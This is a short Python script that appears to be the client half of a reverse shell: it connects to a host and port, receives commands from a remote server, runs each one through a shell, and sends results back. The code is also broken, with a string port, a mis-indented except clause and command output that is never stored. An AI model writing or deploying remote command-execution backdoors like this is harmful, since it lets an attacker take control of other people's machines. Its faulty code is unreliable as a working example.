import socket
import subprocess
HOST = "0.0.0.0"
PORT = "5555"
s = socket.socket()
s.connect((HOST,PORT))
msg = s.recv(1024).decode()
print("[*] server:",msg)
while True:
    cmd = s.recv(1024).decode()
    print(f"[*]receive {cmd}")
    if cmd.lower() == "exit":
        break
    try:
        subprocess.check_output(cmd,stderr=subprocess.STDOUT,shell=True)
        except Exception as e:
            result = str(e).encode()

    s.send(result)
s.close()